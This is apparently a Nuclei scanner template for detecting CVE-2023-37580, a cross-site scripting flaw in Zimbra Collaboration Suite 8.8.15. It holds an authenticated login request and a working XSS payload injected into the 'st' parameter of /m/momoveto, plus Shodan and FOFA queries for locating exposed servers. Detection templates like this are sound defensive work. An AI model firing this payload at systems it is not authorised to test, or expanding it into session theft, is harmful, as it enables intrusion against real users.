id: CVE-2023-37580

info:
  name: Zimbra Collaboration Suite (ZCS) v.8.8.15 - Cross-Site Scripting
  author: ritikchaddha
  severity: medium
  description: |
    Zimbra Collaboration (ZCS) 8 before 8.8.15 Patch 41 allows XSS in the Zimbra Classic Web Client.
  impact: |
    Successful exploitation of this vulnerability could allow an attacker to execute arbitrary script code in the context of the victim's browser, potentially leading to session hijacking, defacement, or theft of sensitive information.
  remediation: |
    Apply the latest security patches or upgrade to a non-vulnerable version of Zimbra Collaboration Suite (ZCS).
  reference:
    - https://github.com/Zimbra/zm-web-client/pull/827
    - https://blog.zimbra.com/2023/07/security-update-for-zimbra-collaboration-suite-version-8-8-15/
    - https://nvd.nist.gov/vuln/detail/CVE-2023-37580
    - https://wiki.zimbra.com/wiki/Security_Center
    - https://wiki.zimbra.com/wiki/Zimbra_Responsible_Disclosure_Policy
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2023-37580
    cwe-id: CWE-79
    epss-score: 0.30373
    epss-percentile: 0.96831
    cpe: cpe:2.3:a:zimbra:zimbra:*:*:*:*:*:*:*:*
  metadata:
    max-request: 2
    vendor: zimbra
    product: zimbra
    shodan-query: http.favicon.hash:475145467
    fofa-query: icon_hash="475145467"
  tags: cve2023,cve,zimbra,xss,authenticated,kev

http:
  - raw:
      - |
        POST /zimbra/ HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        loginOp=login&username={{username}}&password={{password}}&client=mobile
      - |
        GET /m/momoveto?st="><img%20src=x%20onerror=alert(document.domain)> HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        part: body_2
        words:
          - '<img src=x onerror=alert(document.domain)>'
          - 'id="zMoveForm"'
        condition: and

      - type: word
        part: header_2
        words:
          - text/html

      - type: status
        status:
          - 200
# digest: 4a0a00473045022100f8826a6a2aea8b8fdf4bfc526ec4eaf6e1a0613d805ba05235b18095a7a5796b0220449dc6d5f9a0d9bba00cbcd3d271d7ea2cd057ea1993f5acadaeb5edc012f478:922c64590222798bb761d5b6d8e72950